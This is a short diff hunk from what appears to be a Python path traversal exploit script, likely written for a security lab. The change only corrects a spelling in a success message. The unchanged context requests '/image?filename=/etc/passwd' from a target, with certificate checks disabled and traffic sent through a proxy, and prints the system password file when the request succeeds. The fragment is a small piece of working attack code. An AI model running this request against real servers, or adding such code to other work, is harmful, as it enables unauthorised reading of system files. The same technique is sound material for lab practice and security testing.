@@ -9,7 +9,7 @@ def path_traversal_exploit(url):
     filename_path_exploit = '/image?filename=/etc/passwd'
     r = requests.get(url + filename_path_exploit, verify=False ,proxies=proxies)
     if (r.status_code == 200):
-        print("(+) Exploit successfull")
+        print("(+) Exploit successful")
         print("(+) The following is the content of the /etc/passwd file:")
         print(r.text)
         sys.exit(0)
